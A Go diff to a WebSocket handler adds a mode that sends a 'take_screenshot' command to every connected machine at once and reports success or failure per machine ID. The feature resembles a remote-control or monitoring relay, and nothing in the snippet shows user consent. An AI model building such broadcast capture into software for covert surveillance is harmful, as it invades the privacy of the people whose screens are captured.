@@ -91,6 +91,20 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 				continue
 			}
 
+			if parts[1][:3] == "all" {
+				wsConnectionsMachineIDMutex.Lock()
+				for machineID, targetConn := range wsConnectionsMachineID {
+					if err := targetConn.WriteMessage(websocket.TextMessage, []byte("take_screenshot")); err != nil {
+						log.Printf("Error sending screenshot command to machine ID %s: %v", machineID, err)
+						_ = conn.WriteMessage(websocket.TextMessage, []byte("Failed to send screenshot command to machine ID "+machineID))
+						continue
+					}
+					_ = conn.WriteMessage(websocket.TextMessage, []byte("Screenshot command sent to machine ID "+machineID))
+				}
+				wsConnectionsMachineIDMutex.Unlock()
+				continue
+			}
+
 			if parts[1][:10] == "machine_id" {
 				targetMachineID := parts[1][11:]
 				wsConnectionsMachineIDMutex.Lock()
@@ -106,9 +120,8 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 					continue
 				}
 				_ = conn.WriteMessage(websocket.TextMessage, []byte("Screenshot command sent to machine ID "+targetMachineID))
+				continue
 			}
-
-			continue
 		}
 
 		if messageType == websocket.TextMessage {
